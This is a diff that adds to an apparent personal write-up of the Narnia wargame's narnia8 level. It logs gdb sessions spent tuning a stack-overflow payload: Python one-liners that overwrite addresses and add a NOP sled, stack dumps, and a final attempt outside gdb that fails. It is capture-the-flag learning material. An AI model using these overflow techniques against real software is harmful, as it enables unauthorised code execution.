@@ -489,3 +489,123 @@ narnia8
 
 Check it out!! Now all I have to do is change the address "\x9f\xd8\xff\xff", and possibly "\xb0\xd6\xff\xff" to make this shit work outside of gdb
 
+============== Dealing with GDB vs not dealing with GDB stack addresses ======================
+I read somewhere that some of the discrepencies between in gdb and out of gdb stack addresses comes from the env.
+Using env -, which is the same as env -i used to remove env from whatever follows, I should be able to isolate and remove the new variables 
+
+narnia8@narnia:~$ env - gdb /narnia/narnia8
+(gdb) show env
+LINES=62
+COLUMNS=204
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) show env 
+
+So by using this sequence I should be able to get the right addresses for my stack. 
+Now, in a new gdb session WITH the env included:
+
+narnia8@narnia:~$ gdb /narnia/narnia8
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) show env
+TERM=xterm-256color
+SHELL=/bin/bash
+SSH_CLIENT=172.18.0.1 54926 22
+SSH_TTY=/dev/pts/0
+LC_ALL=C
+USER=narnia8
+LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:
+TMOUT=1800
+MAIL=/var/mail/narnia8
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+PWD=/home/narnia8
+LANG=en_US.UTF-8
+SHLVL=1
+HOME=/home/narnia8
+LOGNAME=narnia8
+SSH_CONNECTION=172.18.0.1 54926 172.18.0.32 22
+LESSOPEN=| /usr/bin/lesspipe %s
+LESSCLOSE=/usr/bin/lesspipe %s %s
+_=/usr/bin/gdb
+
+## same env as without gdb, theoretically. 
+## Now going to simplify the payload because of the issues we were having with the breakpoint earlier
+
+(gdb) b *0x080484a7
+Breakpoint 1 at 0x80484a7
+(gdb)  r $(python -c'print "A"*20+"\xb4\xd8\xff\xff"+"B"*12+"\xd0\xd6\xff\xff"+"\x90"*(64-16)')
+Starting program: /narnia/narnia8 $(python -c'print "A"*20+"\xb4\xd8\xff\xff"+"B"*12+"\xd0\xd6\xff\xff"+"\x90"*(64-16)')
+
+Breakpoint 1, 0x080484a7 in func ()
+(gdb) x/200x $esp
+0xffffd690:	0x08048580	0xffffd6a8	0x00000014	0xf7e55fe3
+0xffffd6a0:	0x00000000	0x002c307d	0x41414141	0x41414141
+0xffffd6b0:	0x41414141	0x41414141	0x41414141	0xffffd8b4
+0xffffd6c0:	0x42424242	0x42424242	0x42424242	0xffffd6d0
+0xffffd6d0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd6e0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd6f0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd700:	0x00000002	0xffffd784	0xffffd724	0x080497a4
+0xffffd710:	0x0804820c	0xf7fcc000	0x00000000	0x00000000
+0xffffd720:	0x00000000	0x8be57c33	0xb3ddb823	0x00000000
+0xffffd730:	0x00000000	0x00000000	0x00000002	0x08048330
+0xffffd740:	0x00000000	0xf7ff04c0	0xf7e3c9e9	0xf7ffd000
+0xffffd750:	0x00000002	0x08048330	0x00000000	0x08048351
+0xffffd760:	0x080484ae	0x00000002	0xffffd784	0x080484f0
+0xffffd770:	0x08048560	0xf7feb160	0xffffd77c	0x0000001c
+0xffffd780:	0x00000002	0xffffd8a4	0xffffd8b4	0x00000000
+0xffffd790:	0xffffd90d	0xffffd91d	0xffffd931	0xffffd950
+0xffffd7a0:	0xffffd963	0xffffd96c	0xffffd979	0xffffde9a
+0xffffd7b0:	0xffffdea5	0xffffdf03	0xffffdf1a	0xffffdf29
+0xffffd7c0:	0xffffdf3b	0xffffdf4c	0xffffdf5f	0xffffdf67
+0xffffd7d0:	0xffffdf77	0xffffdfa6	0xffffdfc6	0x00000000
+0xffffd7e0:	0x00000020	0xf7fdbbe0	0x00000021	0xf7fdb000
+0xffffd7f0:	0x00000010	0x178bfbff	0x00000006	0x00001000
+0xffffd800:	0x00000011	0x00000064	0x00000003	0x08048034
+0xffffd810:	0x00000004	0x00000020	0x00000005	0x00000008
+0xffffd820:	0x00000007	0xf7fdc000	0x00000008	0x00000000
+0xffffd830:	0x00000009	0x08048330	0x0000000b	0x000036b8
+0xffffd840:	0x0000000c	0x000036b8	0x0000000d	0x000036b8
+0xffffd850:	0x0000000e	0x000036b8	0x00000017	0x00000000
+0xffffd860:	0x00000019	0xffffd88b	0x0000001f	0xffffdfe8
+0xffffd870:	0x0000000f	0xffffd89b	0x00000000	0x00000000
+0xffffd880:	0x00000000	0x00000000	0xe5000000	0x4e5c9539
+0xffffd890:	0x3ce63a24	0x9e141f64	0x69fcaae5	0x00363836
+0xffffd8a0:	0x00000000	0x72616e2f	0x2f61696e	0x6e72616e
+0xffffd8b0:	0x00386169	0x41414141	0x41414141	0x41414141
+0xffffd8c0:	0x41414141	0x41414141	0xffffd8b4	0x42424242
+0xffffd8d0:	0x42424242	0x42424242	0xffffd6d0	0x90909090
+0xffffd8e0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd8f0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd900:	0x90909090	0x90909090	0x90909090	0x45485300
+0xffffd910:	0x2f3d4c4c	0x2f6e6962	0x68736162	0x52455400
+0xffffd920:	0x74783d4d	0x2d6d7265	0x63363532	0x726f6c6f
+0xffffd930:	0x48535300	0x494c435f	0x3d544e45	0x2e323731
+0xffffd940:	0x302e3831	0x3520312e	0x36323934	0x00323220
+0xffffd950:	0x5f485353	0x3d595454	0x7665642f	0x7374702f
+0xffffd960:	0x4c00302f	0x4c415f43	0x00433d4c	0x52455355
+0xffffd970:	0x72616e3d	0x3861696e	0x5f534c00	0x4f4c4f43
+0xffffd980:	0x723d5352	0x3a303d73	0x303d6964	0x34333b31
+0xffffd990:	0x3d6e6c3a	0x333b3130	0x686d3a36	0x3a30303d
+0xffffd9a0:	0x343d6970	0x33333b30	0x3d6f733a	0x333b3130
+(gdb)  r $(python -c'print "A"*20+"\xb4\xd8\xff\xff"+"B"*12+"\xe0\xd6\xff\xff"+"\x90"*(64-16)')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia8 $(python -c'print "A"*20+"\xb4\xd8\xff\xff"+"B"*12+"\xe0\xd6\xff\xff"+"\x90"*(64-16)')
+
+Breakpoint 1, 0x080484a7 in func ()
+(gdb) c
+Continuing.
+AAAAAAAAAAAAAAAAAAAA����BBBBBBBBBBBB����������������������������������������������������
+
+Program received signal SIGSEGV, Segmentation fault.
+0xffffd700 in ?? ()
+
+## as we can see, the address for the loop changed from 0xffffd89f to 0xffffd8b4
+## and the address for redirection changed from 0xffffd6b0 to 0xffffd6e0
+## let's see if we get the same error outside of gdb
+
+narnia8@narnia:~$ /narnia/narnia8 $(python -c'print "A"*20+"\xb4\xd8\xff\xff"+"B"*12+"\xd0\xd6\xff\xff"+"\x90"*(64-16)')
+AAAAAAAAAAAAAAAAAAAA�B��
+
+Shit... I must be missing something else...
